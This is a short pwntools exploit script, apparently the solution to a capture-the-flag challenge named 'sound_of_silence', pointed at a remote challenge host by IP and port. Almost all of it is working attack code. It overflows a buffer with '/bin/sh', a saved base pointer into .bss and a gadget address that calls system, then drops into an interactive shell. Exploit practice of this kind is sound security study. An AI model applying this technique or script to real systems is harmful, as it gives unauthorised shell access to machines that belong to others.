from pwn import *
context.terminal = ['wezterm.exe', 'cli', 'split-pane', '--right', '--percent', '65']
remote_url = '94.237.54.161'
remote_port = 32566
gdbscript = '''
b *main+46
'''

def conn():
    if args.LOCAL:
        r = process(['./sound_of_silence'])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

exe = ELF('./sound_of_silence')

r = conn()

menu_delim = b'> '
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

mov_rdi_rax_call_system = 0x401169

payload = b'/bin/sh'.ljust(0x20, b'\x00')
payload += p64(exe.bss()+0x50)
payload += p64(mov_rdi_rax_call_system) # rax is still pointing to the address of our payload
sla(b'>>', payload)
r.interactive()

